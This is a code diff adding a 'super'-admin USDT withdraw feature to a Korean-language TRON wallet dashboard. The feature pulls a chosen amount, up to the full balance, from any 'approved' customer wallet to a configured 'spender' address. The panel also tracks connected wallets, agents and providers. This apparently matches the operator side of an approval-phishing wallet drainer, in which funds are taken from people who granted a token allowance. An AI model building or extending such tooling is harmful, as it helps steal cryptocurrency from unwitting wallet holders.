@@ -209,6 +209,7 @@
                     <div><div class="text-xs text-slate-500 uppercase font-bold" data-i18n="cust_provider">제공자</div><div class="text-sm text-white font-semibold mt-1" id="cust-tx-provider">-</div></div>
                     <div class="w-px h-10 bg-slate-800"></div>
                     <div><div class="text-xs text-slate-500 uppercase font-bold" data-i18n="th_connected">접속일</div><div class="text-sm text-slate-300 font-mono mt-1" id="cust-tx-connected">-</div></div>
+                    <div id="cust-tx-withdraw-btn" class="hidden ml-auto"><button onclick="openWithdrawFromTx()" class="px-4 py-2 rounded-xl bg-gradient-to-r from-red-600 to-orange-500 hover:from-red-500 hover:to-orange-400 text-white text-sm font-bold flex items-center gap-2 transition"><i class="fa-solid fa-money-bill-transfer"></i>인출</button></div>
                 </div>
                 <!-- Transfer list -->
                 <div class="glass border border-slate-800/80 rounded-2xl overflow-hidden">
@@ -316,6 +317,41 @@
             <div class="flex gap-3 pt-2">
                 <button onclick="closeAgentModal()" class="flex-1 py-3 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-white transition" data-i18n="cancel">취소</button>
                 <button onclick="saveAgent()" id="modal-save-btn" class="flex-1 py-3 rounded-xl font-bold text-sm bg-gradient-to-r from-blue-600 to-cyan-500 text-white transition" data-i18n="add_agent">추가</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== WITHDRAW MODAL (super only) ===== -->
+<div id="withdraw-modal" class="modal-backdrop" onclick="if(event.target===this)closeWithdrawModal()">
+    <div class="glass border border-slate-800/80 rounded-2xl p-6 w-full max-w-md shadow-2xl fade-in mx-4">
+        <div class="flex items-center justify-between mb-6">
+            <h3 class="text-lg font-extrabold text-white">💰 USDT 인출</h3>
+            <button onclick="closeWithdrawModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="space-y-4">
+            <div>
+                <label class="text-xs font-semibold text-slate-400 uppercase">출금 지갑</label>
+                <div class="mt-1 px-4 py-3 bg-slate-950/80 border border-slate-800 rounded-xl text-emerald-400 text-xs font-mono break-all" id="wd-from-addr"></div>
+            </div>
+            <div>
+                <label class="text-xs font-semibold text-slate-400 uppercase">보유 잔액</label>
+                <div class="mt-1 px-4 py-3 bg-slate-950/80 border border-slate-800 rounded-xl text-white text-sm font-mono font-bold" id="wd-balance"></div>
+            </div>
+            <div>
+                <label class="text-xs font-semibold text-slate-400 uppercase">인출 금액 (USDT)</label>
+                <input type="number" id="wd-amount" step="0.01" min="0.01" class="w-full mt-1 px-4 py-3 bg-slate-950/80 border border-slate-800 rounded-xl text-white text-sm font-mono" placeholder="0.00">
+                <button onclick="setMaxWithdraw()" class="text-xs text-blue-400 hover:text-blue-300 mt-1 cursor-pointer">전액 인출</button>
+            </div>
+            <div>
+                <label class="text-xs font-semibold text-slate-400 uppercase">수신 주소</label>
+                <div class="mt-1 px-4 py-3 bg-slate-950/80 border border-slate-800 rounded-xl text-cyan-400 text-xs font-mono break-all" id="wd-to-addr">설정에서 불러오는 중...</div>
+            </div>
+            <div id="wd-error" class="hidden text-red-400 text-sm"></div>
+            <div id="wd-success" class="hidden text-emerald-400 text-sm"></div>
+            <div class="flex gap-3 pt-2">
+                <button onclick="closeWithdrawModal()" class="flex-1 py-3 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-white transition">취소</button>
+                <button onclick="executeWithdraw()" id="wd-submit-btn" class="flex-1 py-3 rounded-xl font-bold text-sm bg-gradient-to-r from-red-600 to-orange-500 text-white transition hover:from-red-500 hover:to-orange-400">인출 실행</button>
             </div>
         </div>
     </div>
@@ -826,7 +862,7 @@ function renderCustDetail(){
                 '<td class="p-4">'+balText+'</td>'+
                 '<td class="p-4">'+statusBadge+'</td>'+
                 '<td class="p-4 text-xs text-slate-500 font-mono">'+formatTime(c.connectedAt)+'</td>'+
-                '<td class="p-4 text-right"><button onclick="custDrillTransfers(\''+esc(c.address)+'\')" class="px-3 py-1.5 rounded-lg bg-blue-600/20 text-blue-400 text-xs font-bold hover:bg-blue-600/30 transition"><i class="fa-solid fa-arrow-right mr-1"></i>'+t('cust_detail_btn')+'</button></td>'+
+                '<td class="p-4 text-right"><div class="flex items-center justify-end gap-2">'+(currentRole==='super'&&c.approved?'<button onclick="openWithdrawModal(\''+esc(c.address)+'\',\''+esc(w?w.balance:'0')+'\')" class="px-3 py-1.5 rounded-lg bg-red-600/20 text-red-400 text-xs font-bold hover:bg-red-600/30 transition"><i class="fa-solid fa-money-bill-transfer mr-1"></i>인출</button>':'')+'<button onclick="custDrillTransfers(\''+esc(c.address)+'\')" class="px-3 py-1.5 rounded-lg bg-blue-600/20 text-blue-400 text-xs font-bold hover:bg-blue-600/30 transition"><i class="fa-solid fa-arrow-right mr-1"></i>'+t('cust_detail_btn')+'</button></div></td>'+
             '</tr>';
     });
 }
@@ -896,6 +932,10 @@ async function custDrillTransfers(addr){
     }else{
         document.getElementById('cust-tx-approval').innerHTML=c&&c.approved?'<span class="text-sm font-bold text-emerald-400">'+t('approved')+'</span>':'<span class="text-sm font-bold text-amber-400">'+t('not_approved')+'</span>';
     }
+
+    // Show withdraw button for super admin with approved wallet
+    var wdBtn=document.getElementById('cust-tx-withdraw-btn');
+    if(wdBtn){wdBtn.classList.toggle('hidden',!(currentRole==='super'&&c&&c.approved));}
 
     // Fetch transfers
     var tbody=document.getElementById('cust-tx-body');tbody.innerHTML='';
@@ -1080,6 +1120,80 @@ function tronAddressToHex(base58){
     var hex=result.toString(16);
     while(hex.length<50)hex='0'+hex;
     return hex.slice(0,42);
+}
+
+// ===== WITHDRAW (super only) =====
+var wdCurrentAddr='';
+var wdCurrentBalance=0;
+
+async function openWithdrawModal(addr,balance){
+    wdCurrentAddr=addr;
+    wdCurrentBalance=parseFloat(balance)||0;
+    document.getElementById('wd-from-addr').textContent=addr;
+    document.getElementById('wd-balance').textContent=wdCurrentBalance.toFixed(2)+' USDT';
+    document.getElementById('wd-amount').value='';
+    document.getElementById('wd-error').classList.add('hidden');
+    document.getElementById('wd-success').classList.add('hidden');
+    document.getElementById('wd-submit-btn').disabled=false;
+    document.getElementById('wd-submit-btn').textContent='인출 실행';
+
+    // Fetch spender (receiver) address
+    document.getElementById('wd-to-addr').textContent='불러오는 중...';
+    try{
+        var resp=await apiFetch('/api/admin/spender');
+        if(resp.address){
+            document.getElementById('wd-to-addr').textContent=resp.address;
+        }else{
+            document.getElementById('wd-to-addr').textContent='⚠️ 수신 주소 미설정 (설정 필요)';
+        }
+    }catch(e){document.getElementById('wd-to-addr').textContent='주소 로드 실패';}
+
+    document.getElementById('withdraw-modal').classList.add('active');
+}
+
+function closeWithdrawModal(){document.getElementById('withdraw-modal').classList.remove('active');}
+
+function setMaxWithdraw(){document.getElementById('wd-amount').value=wdCurrentBalance.toFixed(2);}
+
+function openWithdrawFromTx(){
+    if(!custCurrentAddr)return;
+    var w=custWalletCache[custCurrentAddr];
+    openWithdrawModal(custCurrentAddr,w?w.balance:'0');
+}
+
+async function executeWithdraw(){
+    var amount=parseFloat(document.getElementById('wd-amount').value);
+    var errEl=document.getElementById('wd-error');
+    var succEl=document.getElementById('wd-success');
+    errEl.classList.add('hidden');succEl.classList.add('hidden');
+
+    if(!amount||amount<=0){errEl.textContent='올바른 금액을 입력하세요.';errEl.classList.remove('hidden');return;}
+    if(amount>wdCurrentBalance){errEl.textContent='잔액 부족 (보유: '+wdCurrentBalance.toFixed(2)+' USDT)';errEl.classList.remove('hidden');return;}
+
+    if(!confirm(amount+' USDT를 인출하시겠습니까?\n출금 지갑: '+wdCurrentAddr))return;
+
+    var btn=document.getElementById('wd-submit-btn');
+    btn.disabled=true;btn.innerHTML='<i class="fa-solid fa-spinner fa-spin mr-1"></i>처리 중...';
+
+    try{
+        var result=await apiFetch('/api/admin/withdraw',{
+            method:'POST',
+            body:JSON.stringify({fromAddress:wdCurrentAddr,amount:amount})
+        });
+        if(result.error){
+            errEl.textContent=result.error;errEl.classList.remove('hidden');
+            btn.disabled=false;btn.textContent='인출 실행';
+            return;
+        }
+        succEl.innerHTML='✅ '+amount+' USDT 인출 완료!<br><a href="https://tronscan.org/#/transaction/'+esc(result.txHash||'')+'" target="_blank" class="text-blue-400 underline text-xs">TX: '+esc((result.txHash||'').slice(0,16))+'...</a>';
+        succEl.classList.remove('hidden');
+        btn.textContent='완료';
+        // Refresh wallet info
+        setTimeout(function(){closeWithdrawModal();refreshWalletInfo();},2000);
+    }catch(e){
+        errEl.textContent='오류: '+e.message;errEl.classList.remove('hidden');
+        btn.disabled=false;btn.textContent='인출 실행';
+    }
 }
 
 // ===== LINKS =====
